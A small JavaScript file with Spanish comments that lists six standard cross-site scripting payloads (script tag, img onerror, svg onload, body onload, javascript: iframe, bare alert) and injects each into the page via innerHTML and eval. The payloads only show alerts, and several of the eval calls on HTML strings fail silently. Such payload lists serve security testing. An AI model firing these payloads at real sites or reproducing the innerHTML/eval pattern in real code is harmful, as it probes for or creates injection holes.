// xss_payload_js.js

// Lista de cargas útiles de XSS
const xssPayloads = [
    "<script>alert('XSS1')</script>",
    "<img src='x' onerror='alert(\"XSS2\")'>",
    "<svg onload='alert(\"XSS3\")'></svg>",
    "<body onload='alert(\"XSS4\")'></body>",
    "<iframe src='javascript:alert(\"XSS5\")'></iframe>",
    "alert('XSS')"
];

// Función para intentar ejecutar cada carga útil
xssPayloads.forEach(payload => {
    try {
        const div = document.createElement('div');
        div.innerHTML = payload;
        document.body.appendChild(div);

        // Si la carga útil es solo un alert, ejecutarla directamente
        if (payload.includes('alert')) {
            eval(payload);
        }
    } catch (e) {
        console.error('Error ejecutando la carga útil:', payload, e);
    }
});
